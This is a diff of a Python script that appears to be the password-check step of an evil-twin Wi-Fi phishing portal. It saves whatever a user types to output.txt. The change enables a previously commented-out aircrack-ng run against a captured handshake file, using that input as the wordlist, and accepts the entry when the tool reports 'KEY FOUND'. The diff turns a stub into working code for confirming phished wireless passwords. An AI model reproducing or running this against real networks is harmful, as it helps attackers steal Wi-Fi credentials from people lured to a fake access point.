@@ -39,13 +39,14 @@ def check_password():
     with open("output.txt", "w") as file:
         file.write(user_input)
 
-    # Uncomment the line below to run aircrack-ng with EvilTwin capabilities
-    # subprocess.run(["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"])
+    # Placeholder for the aircrack-ng command (replace this with your actual command)
+    aircrack_command = ["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"]
 
-    # Placeholder for correct password (replace this with your actual password)
-    correct_password = "your_expected_password"
+    # Run the aircrack-ng command
+    aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)
 
-    if user_input == correct_password:
+    # Check the output for the correct password
+    if "KEY FOUND" in aircrack_result.stdout:
         message = "Correct password :D"
     else:
         message = "Incorrect password! Please try again."
